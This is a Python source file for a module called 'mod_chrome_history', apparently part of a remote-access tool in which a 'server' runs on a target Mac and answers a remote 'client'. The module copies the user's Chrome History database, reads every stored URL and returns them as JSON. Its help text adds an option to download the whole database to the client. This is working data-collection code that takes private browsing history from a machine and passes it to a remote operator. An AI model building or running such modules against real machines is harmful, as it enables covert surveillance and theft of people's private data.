import shutil
import sqlite3
import json
import os
from os.path import expanduser
from apps.server.modules.libs.mod_interface import mod_interface


class mod_chrome_history(mod_interface):
    def setup_mod(self):
        print(f'Module Setup (mod_chrome_history) called successfully!')

    def run_mod(self, cmd = ""):
        shutil.copy2(expanduser("~") + '/Library/Application Support/Google/Chrome/Default/History', 'chrome_hist')
        con = sqlite3.connect('chrome_hist')
        cur = con.cursor()
        cur.execute('SELECT * FROM urls')
        data = cur.fetchall()
        cur.close()
        con.close()
        os.remove('chrome_hist')
        return json.dumps(data)

    def mod_helptxt(self):
        help_txt = {
            'desc': self.pritify4log("The 'Chrome History' module just returns all entries of\n"
                                     "the server's chrome history DB. It makes a copy of the current\n"
                                     "DB and then reads the 'URL' entries which are returned as JSON\n"
                                     "to the client."),
            'cmd': 'ch [-c [<db_filename>]]',
            'ext': self.pritify4log(
                   "-c\tDownload the chrome history DB to client. Optional: <db_filename>\n\n"
                   "Per default the module returns all 'URL' entries of the chrome\n"
                   "history DB as JSON-string. You can also download a copy of the\n"
                   "whole DB to the client with the '-c' param. Default the DB copy will\n"
                   "be saved as 'tmp/chrome_history_db<timestamp>' but you can choose to specify a\n"
                   "custom filename with an argument to the '-c' param with <db_filename>.")
        }
        return help_txt
